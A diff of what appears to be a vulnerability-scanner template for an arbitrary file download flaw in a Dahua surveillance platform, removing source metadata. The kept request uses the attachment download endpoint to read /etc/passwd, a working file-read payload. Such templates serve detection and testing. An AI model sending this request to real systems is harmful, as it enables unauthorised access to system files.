@@ -3,13 +3,8 @@ info:
   name: 大华城市安防监控系统平台存在任意文件下载漏洞(QVD-2023-20736)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/to51gqfp2reqh4og
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: to51gqfp2reqh4og
 http:
 - raw:
   - 'GET /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd HTTP/1.1
